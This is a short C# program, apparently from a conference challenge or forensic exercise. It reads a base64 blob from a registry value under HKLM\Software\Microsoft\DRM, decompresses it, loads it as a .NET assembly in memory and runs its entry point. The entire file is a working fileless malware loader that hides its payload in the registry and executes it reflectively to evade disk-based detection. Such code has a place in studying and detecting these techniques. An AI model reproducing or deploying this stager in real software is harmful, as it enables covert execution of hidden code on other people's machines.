using System;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Linq;
using System.Text;


namespace MyNamespace
{
    class MyClass
    {
        public static void Main()
        {
            //Write your code to read from the reg key, store in "myencodedstream"
            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\DRM");
            string myencodedstream = (string)key.GetValue("grrcon");
            //string myencodedstream = o.ToString();
            //Console.Write(myencodedstream);

            //The remainder 
            var shimsoftware = new System.IO.MemoryStream();
            var shimsoft1 = new System.IO.Compression.DeflateStream(new System.IO.MemoryStream(System.Convert.FromBase64String(myencodedstream)), System.IO.Compression.CompressionMode.Decompress);
            var shimsoft2 = new byte[1024];
            var shimsoft3 = shimsoft1.Read(shimsoft2, 0, 1024);
            while (shimsoft3 > 0)
            {
                shimsoftware.Write(shimsoft2, 0, shimsoft3);
                shimsoft3 = shimsoft1.Read(shimsoft2, 0, 1024);
            }
            System.Reflection.Assembly.Load(shimsoftware.ToArray()).EntryPoint.Invoke(0, new object[] { new string[] { } });

        }
    }
}